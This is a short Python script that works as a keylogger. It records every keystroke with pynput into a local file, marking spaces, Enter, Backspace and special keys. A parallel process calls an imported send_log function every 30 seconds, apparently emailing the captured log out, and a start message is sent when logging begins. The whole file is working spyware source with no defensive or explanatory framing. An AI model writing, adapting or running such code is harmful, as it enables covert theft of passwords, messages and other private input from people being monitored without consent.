from pynput import keyboard, mouse
import os
import datetime
from emailer import send_log, send_application_start_message
import schedule
import time
from multiprocessing import Process


def on_press(key):
    # print(datetime.datetime.now().strftime("%H:%M:%S"))
    try:
        f = open('output.txt', "a")
        f.write(key.char)
        # print('alphanumeric key {0} pressed'.format(key.char))
        return
    except AttributeError:
        # print('special key {0} pressed'.format(key))
        if key == keyboard.Key.space:
            f.write('|')
            return
        if key == keyboard.Key.enter:
            f.write(os.linesep)
            return
        if key == keyboard.Key.backspace:
            f.write('<-')
            return
        f.write(" --{0}--".format(key))
        f.write(os.linesep)
        return


def on_release(key):
    try:
        if key == keyboard.Key.esc:
            return False
    except AttributeError:
        return True


def logging():
    send_application_start_message()
    print("LOGGING")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def emailSending():
    print("EMAILS")
    while True:
        print('ITERATION')
        send_log()
        time.sleep(30)


if __name__ == '__main__':
    p2 = Process(target=emailSending)
    p2.start()
    logging()
    p2.join()
